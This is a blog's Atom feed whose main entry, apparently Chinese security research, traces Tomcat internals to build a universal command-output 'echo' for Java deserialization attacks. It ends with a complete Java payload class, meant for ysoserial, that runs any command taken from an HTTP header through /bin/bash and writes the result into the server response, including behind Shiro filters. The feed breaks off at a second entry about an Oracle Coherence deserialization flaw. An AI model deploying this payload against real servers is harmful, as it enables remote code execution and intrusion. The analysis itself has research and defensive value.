<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lucifaer&#39;s blog</title>
  
  <subtitle>Infomation Security Note</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lucifaer.com/"/>
  <updated>2020-05-12T09:29:49.207Z</updated>
  <id>https://lucifaer.com/</id>
  
  <author>
    <name>Lucifaer</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tomcat通用回显学习</title>
    <link href="https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://lucifaer.com/2020/05/12/Tomcat通用回显学习/</id>
    <published>2020-05-12T09:20:00.000Z</published>
    <updated>2020-05-12T09:29:49.207Z</updated>
    
    <content type="html"><![CDATA[<p>最近两个月都在写通用的Java漏洞利用框架没怎么跟进最新的技术文章，现在项目终于到了一个较为稳定的阶段终于有时间可以学习一下这两个月中的技术文章了。给我印象比较深刻的是<code>LandGrey</code>、<code>李三</code>、<code>kingkk</code>、<code>Litch1</code>、<code>threedr3am</code>几位师傅对于Tomcat通用回显方式的总结。最开始我没看几位师傅的文章自己调了一下，找到了<code>Litch1</code>、和<code>李三</code>师傅的回显思路，本篇主要用于记录个人的调试学习过程。</p><a id="more"></a><h1 id="0x01-思考"><a href="#0x01-思考" class="headerlink" title="0x01 思考"></a>0x01 思考</h1><p>在寻找解决方案前来思考一下具体的需求是什么，我个人的需求如下：</p><ul><li>以中间件为依托完成回显功能</li><li>兼容所有情况（包括Filter插件，以<code>Shiro</code>为例）</li><li>包含中间件所有版本</li></ul><p>以中间件为依托完成回显功能的优势是：</p><ul><li>跨平台通用</li><li>原生支持性好，不会出现连接中断的现象</li></ul><p>综上，可以看到我们需要一种在Tomcat Filter处理逻辑之前就将执行结果写入返回包的回显方式。</p><p>简单的写一个<code>servlet</code>，看一下Tomcat的调用栈。这里我调试的Tomcat版本为<code>8.5.47</code>，不同的Tomcat版本处理逻辑相同，但是其中的部分数据结构有所改变。<br><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892757077506.jpg" alt=""></p><p>为了保证类似<code>Shiro</code>这里<code>Filter</code>应用也可以完成回显，就需要在Tomcat执行该<code>Filter</code>之前将执行结果写入<code>response</code>中。所以核心的切入点就是跟踪<code>Http11Processor</code>的前后处理逻辑，尝试获取本次请求，并将结果写入返回包中。</p><h1 id="0x02-寻找利用链"><a href="#0x02-寻找利用链" class="headerlink" title="0x02 寻找利用链"></a>0x02 寻找利用链</h1><p>寻找利用链主要分为两步，获取本次请求、获取返回包。</p><h2 id="2-1-获取返回包"><a href="#2-1-获取返回包" class="headerlink" title="2.1 获取返回包"></a>2.1 获取返回包</h2><p>首先查看<code>Http11Processor</code>处的逻辑：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892757326923.jpg" alt=""></p><p>主要是调用对应的适配器，并将<code>request</code>和<code>response</code>作为参数传入<code>service()</code>方法中。通过这一部分代码可以得出两点结论：</p><ul><li><code>request</code>和<code>response</code>对象是在此之前就完成初始化的。</li><li>此处使用了适配器模式，证明有多个<code>Processor</code>的执行逻辑是相同的。同时适配器的初始化也是在此前完成的，而适配器的初始化过程中必定存在将本次连接内容保存下来的属性。</li></ul><p>向上跟踪一下<code>request</code>和<code>response</code>对象，发现是在<code>AbstractProcessor</code>抽象类的一个属性，且在构造函数中完成初始化：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890068208490.jpg" alt=""></p><p>而<code>Http11Processor</code>继承于<code>AbstractProcessor</code>，具体的继承树为：</p><p><img src="media/15888311838755/15888318898223.jpg" alt=""></p><p>在<code>Http11Processor</code>的构造方法中调用了父类的构造方法，完成<code>request</code>和<code>response</code>对象的初始化：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890069989955.jpg" alt=""></p><p>ok，目前我们已经知道<code>request</code>和<code>response</code>对象在什么地方完成的初始化，同时也知道了<code>request</code>对象中包含<code>response</code>对象，也就是说我们后面只需要关心如何获取<code>request</code>对象即可。接下来看一下是否有相关的方法可以调用到<code>request</code>这个<code>protected</code>对象：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890093623188.jpg" alt=""></p><p>在<code>AbstractProcessor</code>抽象类中提供了<code>getRequest()</code>方法来获取<code>request</code>对象，同时在<code>Request</code>类中也存在相应的方法获取到<code>Response</code>对象：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890095338231.jpg" alt=""></p><p>如果想要将执行结果写入返回包的包体中，调用<code>Response.doWrite()</code>方法即可，如果想要写到返回包包头中，调用<code>Response.setHeader()</code>方法即可。</p><p>总结一下，目前我们找了获取返回包并写入内容的调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure><h2 id="2-2-获取Processor对象"><a href="#2-2-获取Processor对象" class="headerlink" title="2.2 获取Processor对象"></a>2.2 获取Processor对象</h2><p>在2.1中我们已经完成了回显的后半部分即获取<code>Response</code>，并将内容写入的部分，但是如果想要利用这个调用链，我们就必须继续向上跟踪，找到符合本次请求的<code>Http11Processor</code>对象。</p><p>想要寻找本次请求的<code>Http11Processor</code>对象，就需要从<code>Processor</code>对象的初始化看起，具体的初始化代码在<code>ConnectionHandler#process</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890116078760.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890115687643.jpg" alt=""></p><p><code>connnections</code>对象是<code>ConnectionHandler</code>中定义的一个Map，用于存放<code>socket-processor</code>对象。在这段代码中可以清楚的看到，首次访问时<code>connections</code>中并不存在<code>processor</code>，所以会触发<code>Processor</code>的初始化流程及注册操作。跟进<code>register()</code>方法，查看Tomcat是如何完成<code>Processor</code>注册的。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15890168237122.jpg" alt=""></p><p>这段代码有个非常有意思的地方，我们可以注意到<code>register()</code>方法的关键就是将<code>RequestInfo</code>进行注册，但是在注册前会调用<code>rp.setGlobalProcessor(global);</code>我们来具体看一下<code>global</code>是什么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15891847561234.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15891847886019.jpg" alt=""></p><p>可以看到<code>RequestGroupInfo</code>类中存在<code>RequestInfo</code>的一个列表，在<code>RequestInfo</code>的<code>setGlobalProcessor()</code>方法中又将<code>RequestInfo</code>对象本身注册到<code>RequestGroupInfo</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15891855964379.jpg" alt=""></p><p>所以<code>global</code>中所保存的内容和后面调用<code>Registry.registerComponent()</code>方法相同。也就是说有两种思路获取<code>Processor</code>对象：</p><ul><li>寻找获取<code>global</code>的方法</li><li>跟踪<code>Registry.registerComponent()</code>流程，查看具体的<code>RequestInfo</code>对象被注册到什么地方了</li></ul><p>两种方法对应了<code>Litch1</code>和<code>李三</code>师傅的两种获取方式。</p><h3 id="2-2-1-获取global"><a href="#2-2-1-获取global" class="headerlink" title="2.2.1 获取global"></a>2.2.1 获取<code>global</code></h3><p>想要获取<code>global</code>就需要获取到<code>AbstractProtocol</code>，<code>AbstractProtocol</code>实现了<code>ProtocolHandler</code>，也就是说只要能找到获取<code>ProtocolHandler</code>实现类的方法就可以调用<code>AbstractProtocol</code>的<code>ConnectionHandler</code>静态类。依赖树如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15891924565603.jpg" alt=""></p><p>所以调用链就变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AbstractProtocol$ConnectionHandler -&gt;</span><br><span class="line">global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure><p>到此为止我们已经找到大半部分的调用链了，那如何找到获取<code>ProtocolHandler</code>的方法呢？这需要向下看，看具体调用时是如何触发的。Tomcat使用了<code>Coyote</code>框架来封装底层的socket连接数据，在<code>Coyote</code>框架中包含了核心类<code>ProtocolHandler</code>，主要用于接收<code>socket</code>对象，再交给对应协议的<code>Processor</code>类，最后由<code>Processor</code>类交给实现了<code>Adapter</code>接口的容器。</p><p>在调用栈中也可以看出这一流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892471425581.jpg" alt=""></p><p>这里直接跟进一下<code>CoyoteAdapter#service</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892474942710.jpg" alt=""></p><p>这里主要负责将<code>org.apache.coyote.Request</code>和<code>org.apache.coyote.Response</code>转换为<code>org.apache.catalina.connector.Request</code>和<code>org.apache.catalina.connector.Response</code>，如果还未注册为notes，则调用<code>connector</code>的<code>createRequest()</code>和<code>createResponse()</code>方法创建对应的<code>Request</code>和<code>Response</code>对象。</p><p>而关键的调用为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892478592030.jpg" alt=""></p><p>可以简单的理解一下：<code>CoyoteAdapter</code>通过<code>connector</code>对象来完成后续流程的，也就是说在<code>connector</code>对象中保存着和本次请求有关的所有信息，较为准确的说法是在Tomcat初始化<code>StandardService</code>时，会启动<code>Container</code>、<code>Executor</code>、<code>mapperListener</code>及所有的<code>Connector</code>。其中<code>Executor</code>负责为<code>Connector</code>处理请求提供共用的线程池，<code>mapperListener</code>负责将请求映射到对应的容器中，<code>Connector</code>负责接收和解析请求。所以对于单个请求来说，其相关的信息及调用关系都保存在<code>Connector</code>对象中，从上面的代码中也可以看出一些端倪。所以直接看一下<code>Connection</code>类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892517959351.jpg" alt=""></p><p>其中有public方法<code>getProtocolHandler()</code>可以直接获得<code>ProtocolHandler</code>。所以调用链就变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Connector#getProtocolHandler() -&gt;</span><br><span class="line">AbstractProtocol$ConnectionHandler -&gt;</span><br><span class="line">global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure><p>就如上文所说，<code>Connector</code>是在Tomcat初始化<code>StandardService</code>时完成初始化的，初始化的具体代码在<code>org.apache.catalina.core.StandardService#initInternal</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892520324325.jpg" alt=""></p><p>而在初始化<code>StandardService</code>之前就已经调用<code>org.apache.catalina.startup.Tomcat#setConnector</code>完成<code>Connector</code>设置了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892526355238.jpg" alt=""></p><p>所以再次梳理一下调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">StandardService -&gt;</span><br><span class="line">Connector#getProtocolHandler() -&gt;</span><br><span class="line">AbstractProtocol$ConnectionHandler -&gt;</span><br><span class="line">global -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure><p>最终的问题就是如何获得<code>StandardService</code>了，这里可以利用打破双亲委派的思路，这一点在我写Java攻击框架时用过，就是利用<code>Thread.getCurrentThread().getContextClassLoader()</code>来获取当前线程的<code>ClassLoader</code>，从<code>resources</code>当中寻找即可。</p><p>具体的利用代码这里就不再赘述了，可以直接看<a href="https://github.com/buptchk/ysoserial/" target="_blank" rel="noopener">Litch1师傅分享出的代码</a>。</p><h3 id="2-2-2-从Registry中获取"><a href="#2-2-2-从Registry中获取" class="headerlink" title="2.2.2 从Registry中获取"></a>2.2.2 从Registry中获取</h3><p>其实回顾一下2.2.1中所提到的内容，无非是从<code>Connector</code>入手拿到<code>ProtocolHandler</code>。其实再仔细看一下<code>Connector</code>类的依赖树就可以发现其实所有的参数并非是单独存放在这些类中的一个属性中的，而是都被注册到了<code>MBeanServer</code>中的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892540185829.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892540343863.jpg" alt=""></p><p>所以其实更加通用的方式就是直接通过<code>MBeanServer</code>来获得这个参数。</p><p>我们在2.2中看到了<code>ConnectionHandler</code>是用<code>Registry.getRegistry(null, null).registerComponent(rp,rpName, null);</code>将<code>RequestInfo</code>注册到<code>MBeanServer</code>中的，那么我们跟进看一下<code>Registry</code>类中有什么方法可以供我们获得<code>MBeanServer</code>，只要拿到了<code>MBeanServer</code>，就可以从其中拿到被注册的<code>RequestInfo</code>对象了。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892545540421.jpg" alt=""></p><p><code>Registry</code>类中提供了<code>getMBeanServer()</code>方法用于获得（或创建）<code>MBeanServer</code>。在<code>JmxMBeanServer</code>中，其<code>mbsInterceptor</code>对象存放着对应的<code>MBeanServer</code>实例，这个<code>mbsInterceptor</code>对象经过动态调试就是<code>com.sun.jmx.interceptor.DefaultMBeanServerInterceptor</code>。在<code>DefaultMBeanServerInterceptor</code>存在一个<code>Repository</code>属性由于将注册的MBean进行保存，我们这里可以直接使用<code>com.sun.jmx.mbeanserver.Repository#query</code>方法来筛选出所有注册名（其实就是具体的每次请求）包含<code>http-nio-*</code>（*为具体的tomcat端口号）的<code>BaseModelMBean</code>对象：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892687626028.jpg" alt=""></p><p>这里由于测试的关系只存在一个对象，在具体构造时可以直接遍历所有符合条件的情况。其中<code>object.resource.processors</code>中就保存着请求的<code>RequestInfo</code>对象，至此就可以通过<code>RequestInfo</code>对象的<code>req</code>属性来得到请求的<code>Response</code>对象，完成回显。</p><p>总结一下调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(null, null).getMBeanServer() -&gt;</span><br><span class="line">JmxMBeanServer.mbsInterceptor -&gt;</span><br><span class="line">DefaultMBeanServerInterceptor.repository -&gt;</span><br><span class="line">Registory#query -&gt;</span><br><span class="line">RequestInfo -&gt;</span><br><span class="line">Http11Processor#getRequest() -&gt; </span><br><span class="line">AbstractProcessor#getRequest() -&gt;</span><br><span class="line">Request#getResponse() -&gt;</span><br><span class="line">Response#doWrite()</span><br></pre></td></tr></table></figure><h1 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h1><p>具体的调用逻辑在2.2.1和2.2.2中都有总结，总体来说就是用反射一点点完成构造，这里我只罗列2.2.2中的方法，因为2.2.2的方法更为通用，可以经测试在Tomcat7、8、9中都可以使用。需要注意有以下几点：</p><ul><li>Tomcat7及低版本Tomcat8（具体版本没有测试，实验用版本为8.5.9）中，在最终将结果写入Response时需要使用<code>ByteChunk</code>而非<code>ByteBuffer</code></li><li>Tomcat9及高版本Tomcat8（试验用版本为8.5.47）只能使用<code>ByteBuffer</code></li></ul><p>最终的利用代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lucifaer.tomcatEcho;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jmx.mbeanserver.NamedObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.jmx.mbeanserver.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> javax.management.ObjectName;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Lucifaer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 4.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tomcat8</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tomcat8</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object mbsInterceptor = field.get(mBeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Repository repository = (Repository) field.get(mbsInterceptor);</span><br><span class="line">            Set&lt;NamedObject&gt; set = repository.query(<span class="keyword">new</span> ObjectName(<span class="string">"*:type=GlobalRequestProcessor,name=\"http*\""</span>), <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Iterator&lt;NamedObject&gt; it = set.iterator();</span><br><span class="line">            <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">                NamedObject namedObject = it.next();</span><br><span class="line">                field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ObjectName flag = (ObjectName) field.get(namedObject);</span><br><span class="line">                String canonicalName = flag.getCanonicalName();</span><br><span class="line"></span><br><span class="line">                field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object obj = field.get(namedObject);</span><br><span class="line"></span><br><span class="line">                field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object resource = field.get(obj);</span><br><span class="line"></span><br><span class="line">                field = Class.forName(<span class="string">"org.apache.coyote.RequestGroupInfo"</span>).getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ArrayList processors = (ArrayList) field.get(resource);</span><br><span class="line"></span><br><span class="line">                field = Class.forName(<span class="string">"org.apache.coyote.RequestInfo"</span>).getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; processors.size(); i++) &#123;</span><br><span class="line">                    Request request = (Request) field.get(processors.get(i));</span><br><span class="line">                    String header = request.getHeader(<span class="string">"lucifaer"</span>);</span><br><span class="line">                    System.out.println(<span class="string">"cmds is:"</span> + header);</span><br><span class="line">                    System.out.println(header == <span class="keyword">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (header != <span class="keyword">null</span> &amp;&amp; !header.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                        String[] cmds = <span class="keyword">new</span> String[] &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, header&#125;;</span><br><span class="line">                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                        Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                        String out = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span> (s.hasNext()) &#123;</span><br><span class="line">                            out += s.next();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">byte</span>[] buf = out.getBytes();</span><br><span class="line">                        <span class="keyword">if</span> (canonicalName.contains(<span class="string">"nio"</span>)) &#123;</span><br><span class="line">                            ByteBuffer byteBuffer = ByteBuffer.wrap(buf);</span><br><span class="line"><span class="comment">//                    request.getResponse().setHeader("echo", out);</span></span><br><span class="line">                            request.getResponse().doWrite(byteBuffer);</span><br><span class="line">                            request.getResponse().getBytesWritten(<span class="keyword">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (canonicalName.contains(<span class="string">"bio"</span>)) &#123;</span><br><span class="line">                            <span class="comment">//tomcat 7使用需要使用ByteChunk来将byte写入</span></span><br><span class="line"><span class="comment">//                            ByteChunk byteChunk = new ByteChunk();</span></span><br><span class="line"><span class="comment">//                            byteChunk.setBytes(buf, 0, buf.length);</span></span><br><span class="line"><span class="comment">//                            request.getResponse().doWrite(byteChunk);</span></span><br><span class="line"><span class="comment">//                            request.getResponse().getBytesWritten(true);</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">            throwable.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体如何将其加入Ysoserial，可以参考<a href="https://xz.aliyun.com/t/7535" target="_blank" rel="noopener"><code>李三</code>师傅的方式</a>。</p><p>利用效果如下：</p><blockquote><p>测试普通JSP</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892739066262.jpg" alt=""></p><blockquote><p>测试shiro</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2020/05/12/15892739715573.jpg" alt=""></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://github.com/buptchk/ysoserial/" target="_blank" rel="noopener">https://github.com/buptchk/ysoserial/</a></li><li><a href="https://xz.aliyun.com/t/7535" target="_blank" rel="noopener">https://xz.aliyun.com/t/7535</a></li><li><a href="https://blog.csdn.net/yangsnow_rain_wind/article/details/80049506" target="_blank" rel="noopener">https://blog.csdn.net/yangsnow_rain_wind/article/details/80049506</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651374294&amp;idx=3&amp;sn=82d050ca7268bdb7bcf7ff7ff293d7b3</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近两个月都在写通用的Java漏洞利用框架没怎么跟进最新的技术文章，现在项目终于到了一个较为稳定的阶段终于有时间可以学习一下这两个月中的技术文章了。给我印象比较深刻的是&lt;code&gt;LandGrey&lt;/code&gt;、&lt;code&gt;李三&lt;/code&gt;、&lt;code&gt;kingkk&lt;/code&gt;、&lt;code&gt;Litch1&lt;/code&gt;、&lt;code&gt;threedr3am&lt;/code&gt;几位师傅对于Tomcat通用回显方式的总结。最开始我没看几位师傅的文章自己调了一下，找到了&lt;code&gt;Litch1&lt;/code&gt;、和&lt;code&gt;李三&lt;/code&gt;师傅的回显思路，本篇主要用于记录个人的调试学习过程。&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Tomcat" scheme="https://lucifaer.com/tags/Tomcat/"/>
    
      <category term="回显方案" scheme="https://lucifaer.com/tags/%E5%9B%9E%E6%98%BE%E6%96%B9%E6%A1%88/"/>
    
  </entry>
  
  <entry>
    <title>Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）</title>
    <link href="https://lucifaer.com/2020/03/10/Oracle%20Coherence%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-2555%EF%BC%89/"/>
    <id>https://lucifaer.com/2020/03/10/Oracle Coherence 反序列化漏洞分析（CVE-2020-2555）/</id>
